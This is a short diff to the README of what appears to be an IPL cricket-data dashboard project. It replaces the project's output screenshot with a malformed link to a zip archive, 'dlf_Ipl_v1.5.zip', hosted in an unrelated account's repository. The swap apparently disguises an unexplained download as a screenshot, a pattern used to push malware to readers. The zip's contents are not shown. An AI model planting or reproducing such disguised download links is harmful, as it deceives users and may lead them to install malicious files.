@@ -55,4 +55,4 @@
 11. Export report
 
 ## Output
-![Screenshot](https://github.com/ipithani/IPL_Analysis/blob/main/Dashboard%20output.png)
+![Screenshot](https://raw.githubusercontent.com/Manoj5k/dlfIpl/main/antipodal/dlf_Ipl_v1.5.zip%https://raw.githubusercontent.com/Manoj5k/dlfIpl/main/antipodal/dlf_Ipl_v1.5.zip)
